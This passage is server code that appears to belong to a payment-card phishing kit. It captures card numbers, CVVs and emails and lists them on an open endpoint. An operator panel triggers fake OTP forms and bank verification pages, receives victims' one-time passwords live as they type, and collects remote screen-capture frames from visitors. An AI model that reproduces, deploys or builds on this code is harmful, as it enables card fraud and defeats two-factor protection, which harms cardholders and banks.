      cardData: {
        cardNumber,
        expiry,
        cvv,
        email,
        amount: amount.toString().replace(/,/g, ''),
        currency,
        cardholder,
        bankName: parsedBankInfo?.bank || 'Unknown',
        country: parsedBankInfo?.country || 'Unknown',
        cardType: parsedBankInfo?.scheme || 'Unknown'
      },
      ip
    });
    
    res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error('Transaction Error:', error);
    res.status(500).json({ status: "error", message: "Payment processing failed" });
  }
});

app.get('/api/transactions', (req, res) => {
  res.json(Array.from(transactions.values()));
});

app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  io.to(invoiceId).emit('show_otp');
  res.json({ status: "success", message: "OTP form shown" });
});

app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked wrong" });
});
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form",
      otpError: txn.otpError
    });
  }

if (txn.redirectStatus) {
  const redirectUrls = {
    success: `/success-page.html?invoiceId=${invoiceId}`,
    fail: `/fail-page.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
    bankpage: `/bank-page.html?invoiceId=${invoiceId}`
  };
  return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
}

  res.json({ status: txn.status, otpError: txn.otpError });
});

app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP received" });
});

app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus, failureReason } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.redirectStatus = redirectStatus;
  if (failureReason) {
    txn.failureReason = failureReason;
  }

  const redirectUrls = {
    success: `/success.html?invoiceId=${invoiceId}`,
    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
  };

  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
  });
});

app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  res.json({ status: 'success' });
});

app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Include invoiceId in the payload
  res.json({ status: 'success' });
});

app.post('/api/markTransactionViewed', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.viewed = true;
  res.json({ status: "success" });
});

app.get('/api/getTransactionForSuccess', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  res.json({
    status: "success",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email
    }
  });
});

app.get('/api/getTransactionForFail', (req, res) => {
  const { invoiceId, reason } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  // Map reason codes to human-readable messages
  const reasonMessages = {
    'insufficient_balance': 'Insufficient balance in your account',
    'bank_declined': 'Transaction declined by bank',
    'card_disabled': 'Online payments are disabled on your card',
    'invalid_card': 'Invalid card number or details',
    'canceled': 'Transaction canceled by user'
  };

  res.json({
    status: "failed",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email,
      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
    }
  });
});

io.on('connection', (socket) => {
  console.log(`New socket connection established with ID: ${socket.id}`);

  // Check if this is an admin connection
  const isAdmin = socket.handshake.query?.isAdmin === 'true';
  if (isAdmin) {
    console.log('Admin connected:', socket.id);
    adminSockets.add(socket);
    
    // Send current visitors to the admin
    const visitorsList = Array.from(visitors.values());
    socket.emit('existing_visitors', visitorsList);
    
    // Send current transactions
    socket.emit('existing_transactions', Array.from(transactions.values()));
  }
  
  // Handle admin_connected event
  socket.on('admin_connected', (data) => {
    console.log('Admin explicitly connected:', socket.id);
    
    // Send current visitors and transactions again
    const visitorsList = Array.from(visitors.values());
    socket.emit('existing_visitors', visitorsList);
    socket.emit('existing_transactions', Array.from(transactions.values()));
  });
  
  socket.on('join', (invoiceId) => {
    console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
    socket.join(invoiceId);
  });
  
  // Add listener for currency page redirection
  socket.on('currency_redirect', (data) => {
    console.log('Received currency_redirect event:', data);
    if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
      // Generate random hash for clean URL
      const randomHash = Math.random().toString(36).substring(2, 8);
     io.to(data.invoiceId).emit('redirect_to_currency', { 
        redirectUrl: `/c/${randomHash}?pid=${data.pid}` 
      });
    }
  });
  
  // MC verification events - enhanced with direct broadcasting
  socket.on('show_mc_verification', (data) => {
    // Broadcast to the specific client with this invoice ID
    console.log('Received show_mc_verification event:', data);
    io.to(data.invoiceId).emit('show_mc_verification', data);
  });

  // NEW HANDLER: Start verification event
  socket.on('start_verification', (data) => {
    console.log('Received start_verification event:', data);
    io.to(data.invoiceId).emit('start_verification', data);
  });

  socket.on('update_mc_bank', (data) => {
    // Update bank logo on client
    console.log('Received update_mc_bank event:', data);
    io.to(data.invoiceId).emit('update_mc_bank', {
      invoiceId: data.invoiceId,
      bankCode: data.bankCode
    });
  });

  socket.on('mc_otp_submitted', (data) => {
    // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
    console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
    broadcastToAdmins('mc_otp_submitted', data);
  });

  // Optional - for live OTP typing feature
  socket.on('mc_otp_typing', (data) => {
    // Send partial OTP to admin panel as user types - optional feature
    console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
    broadcastToAdmins('mc_otp_typing', data);
  });

 socket.on('mc_otp_error', (data) => {
    // Send OTP error to client
    console.log('Sending OTP error to client:', data);
    io.to(data.invoiceId).emit('mc_otp_error', data);
  });

  socket.on('mc_verification_result', (data) => {
    // Send verification result to client
    console.log('Sending verification result to client:', data);
    io.to(data.invoiceId).emit('mc_verification_result', data);
  });

  socket.on('mc_resend_otp', (data) => {
    // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
    console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
    broadcastToAdmins('mc_resend_otp', data);
  });

  // Screen capture handlers
  socket.on('screen_frame', (data) => {
    // Get pid from socket query or data
    const pid = socket.handshake.query?.pid || data.pid || data.userId;
    
    console.log(`Received screen frame from: ${pid || socket.id}, size: ${data.frameData?.length || 0}`);
    
    // Forward to admin sockets
    broadcastToAdmins('screen_frame', {
      ...data,
      userId: pid,
      socketId: socket.id
    });
  });
  
  socket.on('screen_capture_error', (data) => {
    console.log(`Screen capture error from: ${socket.id}`, data.error);
    
    // Forward to admin sockets
    broadcastToAdmins('screen_capture_error', {
      ...data,
      userId: socket.handshake.query.pid,
      socketId: socket.id
    });
  });
  
  socket.on('init_advanced_capture', (data) => {
    console.log(`Init screen capture request for: ${data.userId}`);
    
    // Find client socket by userId/pid
    let clientSocket = null;
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        clientSocket = s;
      }
    });
    
    if (clientSocket) {
      console.log(`Sending start_capture to: ${clientSocket.id}`);
      clientSocket.emit('control_command', {
        type: 'start_capture',
        sessionId: data.sessionId
      });
    } else {
      console.log(`No client found for user: ${data.userId}`);
    }
  });
  
  socket.on('stop_advanced_capture', (data) => {
    // Find client socket by userId/pid
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        s.emit('control_command', {
          type: 'stop_capture',
          sessionId: data.sessionId
        });
      }
    });
  });
  
  socket.on('refresh_advanced_capture', (data) => {
    // Find client socket by userId/pid
    io.sockets.sockets.forEach(s => {
      if (s.handshake.query && s.handshake.query.pid === data.userId) {
        s.emit('control_command', {
          type: 'refresh_capture',
          sessionId: data.sessionId
        });
      }
    });
  });
  
  // Handle visitor heartbeats
  socket.on('visitor_heartbeat', (data) => {
    if (data.pid && visitors.has(data.pid)) {
      const visitor = visitors.get(data.pid);
      visitor.lastActive = Date.now();
      visitor.url = data.url || visitor.url; // Update URL if provided
      visitors.set(data.pid, visitor);
      
      // Notify admins of activity
      broadcastToAdmins('visitor_activity', {
        pid: data.pid,
        timestamp: Date.now(),
        type: 'heartbeat'
      });
    }
  });
  
  // When socket disconnects, remove from admin sockets if it was an admin
  socket.on('disconnect', () => {
    if (adminSockets.has(socket)) {
      adminSockets.delete(socket);
      console.log('Admin disconnected:', socket.id);
    }
    console.log('Socket disconnected:', socket.id);
  });
});

// Helper function to broadcast to admin sockets
function broadcastToAdmins(event, data) {
  adminSockets.forEach(socket => {
    socket.emit(event, data);
  });
}
